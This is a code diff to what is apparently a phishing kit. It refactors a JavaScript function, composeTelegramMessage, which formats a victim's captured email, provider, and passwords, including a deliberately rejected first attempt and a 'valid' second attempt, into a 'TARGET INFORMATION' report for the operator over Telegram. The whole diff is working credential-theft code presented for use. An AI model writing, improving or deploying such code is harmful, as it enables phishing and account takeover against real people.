@@ -108,35 +108,33 @@ const composeTelegramMessage = (data) => {
 
     const hasTwoStepData = firstAttemptPassword && secondAttemptPassword;
 
-    let passwordSection;
-    if (hasTwoStepData) {
-        passwordSection = `🔐 **CREDENTIALS CAPTURED**
+    let message = `👤 TARGET INFORMATION
 ┌─────────────────────────────────
-│ 🚫 **Invalid Password:** \`${firstAttemptPassword}\`
-│ ✅ **Valid Password:** \`${secondAttemptPassword}\`
+│ 📧 Email: \`${email || 'Not captured'}\`
+│ 🏢 Platform: *${provider || 'Others'}*`;
+
+    if (hasTwoStepData) {
+        message += `
+│ 🚫 Invalid Password: \`${firstAttemptPassword}\`
+│ ✅ Valid Password: \`${secondAttemptPassword}\`
 └─────────────────────────────────`;
     } else {
-        passwordSection = `🔐 **CREDENTIALS CAPTURED**
-┌─────────────────────────────────
-│ 🔑 **Password:** \`${password || 'Not captured'}\`
+        message += `
+│ 🔑 Password: \`${password || 'Not captured'}\`
 └─────────────────────────────────`;
     }
 
-    return `👤 **TARGET INFORMATION**
-┌─────────────────────────────────
-│ 📧 **Email:** \`${email || 'Not captured'}\`
-│ 🏢 **Platform:** *${provider || 'Others'}*
-│ ⏰ **Captured:** ${new Date().toLocaleString('en-US', { 
+    message += `
+│ ⏰ Captured: ${new Date().toLocaleString('en-US', { 
         timeZone: 'UTC',
         year: 'numeric',
         month: 'short', 
         day: 'numeric',
         hour: '2-digit',
         minute: '2-digit'
-    })} UTC
-└─────────────────────────────────
+    })} UTC`;
 
-${passwordSection}`;
+    return message;
 };
 
 /**
